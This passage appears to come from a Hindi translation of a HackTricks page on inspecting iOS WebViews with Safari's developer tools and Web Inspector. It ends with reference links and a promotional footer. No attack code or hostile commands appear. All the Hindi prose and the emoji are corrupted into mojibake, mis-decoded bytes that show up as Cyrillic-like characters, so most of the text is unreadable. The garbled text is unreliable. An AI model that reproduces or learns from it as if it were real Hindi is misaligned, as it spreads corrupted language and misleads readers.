* рдЕрдЧрд▓реЗ, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдбреЗрд╡ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ Safari рдореЗрдВ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рднреА рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЕрдкрдиреЗ рдбреЗрд╡ рдорд╢реАрди рдкрд░ Safari рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ рдФрд░ рдореЗрдиреНрдпреВ рдмрд╛рд░ рдореЗрдВ **Safari > Preferences** рдореЗрдВ рдЬрд╛рдПрдВред рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдкрдиреНрдирд╛ рдореЗрдВ, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП _рд╡рд┐рдХрд╕рд┐рдд рдореЗрдиреВ рджрд┐рдЦрд╛рдПрдВ_ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдкрдиреНрдирд╛ рдХреЛ рдмрдВрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![Mac Safari рд╕реЗрдЯрд┐рдВрдЧреНрд╕](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* рдЕрдкрдиреА iOS рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдЕрдкрдиреЗ рдбреЗрд╡ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ рдФрд░ рдЕрдкрдирд╛ рдРрдк рд▓реЙрдиреНрдЪ рдХрд░реЗрдВред
* рдЕрдкрдиреЗ рдбреЗрд╡ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ Safari рдореЗрдВ, рдореЗрдиреНрдпреВ рдмрд╛рд░ рдореЗрдВ _рд╡рд┐рдХрд╕рд┐рдд_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЕрдкрдиреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рдирд╛рдо рдХрд╛ рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╡рд┐рдХрд▓реНрдк рдкрд░ рд╣реЛрд╡рд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдкрдХреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╡реЗрдмрд╡реНрдпреВ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рд╕реВрдЪреА рджрд┐рдЦрд╛рдИ рджреЗред

![Mac Safari рд╡рд┐рдХрд╕рд┐рдд рдореЗрдиреВ](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* рдбреАрдмрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд╡реЗрдмрд╡реНрдпреВ рдХреЗ рд▓рд┐рдП рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╡рд┐рдХрд▓реНрдк рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЗрд╕рд╕реЗ рд╡реЗрдмрд╡реНрдпреВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ Safari рд╡реЗрдм рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╡рд┐рдВрдбреЛ рдЦреБрд▓реЗрдЧреАред

![Safari рд╡реЗрдм рдЗрдВрд╕реНрдкреЗрдХреНрдЯрд░ рд╡рд┐рдВрдбреЛ](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## рд╕рдВрджрд░реНрдн

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред
